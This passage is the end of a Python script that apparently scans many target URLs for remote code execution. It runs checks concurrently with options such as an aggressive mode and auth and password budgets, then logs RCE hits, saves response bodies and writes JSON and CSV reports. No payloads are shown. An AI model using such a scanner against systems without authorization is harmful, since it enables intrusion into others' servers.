                    try_time_based=not args.no_time_based,
                    only_http_200=args.only_http_200,
                    aggressive=args.aggressive,
                    aggr_budget=args.aggr_budget,
                    aggr_max_auth=args.aggr_max_auth,
                    aggr_max_pass=args.aggr_max_pass,
                    extra_kv_list=extra_kv_list,
                    alt_evidence=alt_evidence
                ): t for t in targets}

        for fut in as_completed(futs):
            url = futs[fut]
            row = fut.result()
            results.append(row)

            # counters
            if row["rce"]:
                rce_yes += 1
                last_tag = f"{C_GREEN}RCE{C_RESET}"
            elif row["error"]:
                err_cnt += 1
                last_tag = f"{C_YELLOW}ERR{C_RESET}"
            else:
                rce_no += 1
                last_tag = f"{C_RED}NO-RCE{C_RESET}"

            # detail
            tag = "RCE" if row["rce"] else ("ERR" if row["error"] else "NO-RCE")
            detail = (row.get("evidence") or row.get("error") or "")
            verbose_rows.append({"tag": tag, "url": row["url"], "detail": detail})
            log_lines.append(f"[{tag}] {row['url']} sc={row.get('status_code')} dt={row.get('elapsed')} ev='{detail}'")

            # Save body if requested
            if bodies_dir:
                save_it = args.save_bodies_all or row["rce"]
                if save_it:
                    body = row.get("resp_text")
                    if body is None:
                        body = ""
                    try:
                        fn = f"{_safe_name_from_url(url)}_{tag}_{(row.get('method') or 'NA')}_{(row.get('param') or 'NA')}_{datetime.now().strftime('%H%M%S')}.html"
                        fpath = os.path.join(bodies_dir, fn)
                        with open(fpath, "w", encoding="utf-8", errors="ignore") as bf:
                            bf.write(body)
                        log_lines.append(f"[BODY] saved -> {fpath}")
                    except Exception as e:
                        log_lines.append(f"[BODY][ERR] {e}")

            prog.set_postfix_str(make_postfix(rce_yes, rce_no, err_cnt, last_tag, now_url=url))
            prog.update(1)

    prog.close()
    write_json(out_path, results)
    write_csv(csv_path, results)

    # Positives only
    positives = [r for r in results if r.get("rce")]
    write_json(pos_json, positives)
    write_csv(pos_csv, positives)

    emit_mapping_hints(results, targets, verbose=args.verbose)

    if args.verbose and verbose_rows:
        for r in verbose_rows:
            color = C_GREEN if r["tag"]=="RCE" else (C_YELLOW if r["tag"]=="ERR" else C_RED)
            print(f"{color}[{r['tag']}]{C_RESET} {r['url']} {('— '+r['detail']) if r['detail'] else ''}")

    finished_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_lines.append(f"[END] {finished_at}")
    log_lines.append(f"SUMMARY RCE:{rce_yes} NO-RCE:{rce_no} ERR:{err_cnt}")

    try:
        with open(log_path, "w", encoding="utf-8") as lf:
            lf.write("\n".join(log_lines) + "\n")
    except Exception as e:
        print(f"{C_YELLOW}[WARN]{C_RESET} Could not write log: {e}")

    print(f"\n{C_CYAN}[INFO]{C_RESET} DONE — "
          f"{C_GREEN}RCE: {rce_yes}{C_RESET}   "
          f"{C_RED}NO-RCE: {rce_no}{C_RESET}   "
          f"{C_YELLOW}ERR: {err_cnt}{C_RESET}")
    print(f"{C_CYAN}[INFO]{C_RESET} JSON → {out_path}")
    print(f"{C_CYAN}[INFO]{C_RESET} CSV  → {csv_path}")
    print(f"{C_CYAN}[INFO]{C_RESET} POS  → {pos_json} / {pos_csv}")
    print(f"{C_CYAN}[INFO]{C_RESET} LOG  → {log_path}")
    if bodies_dir:
        print(f"{C_CYAN}[INFO]{C_RESET} Bodies → {bodies_dir}")

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()



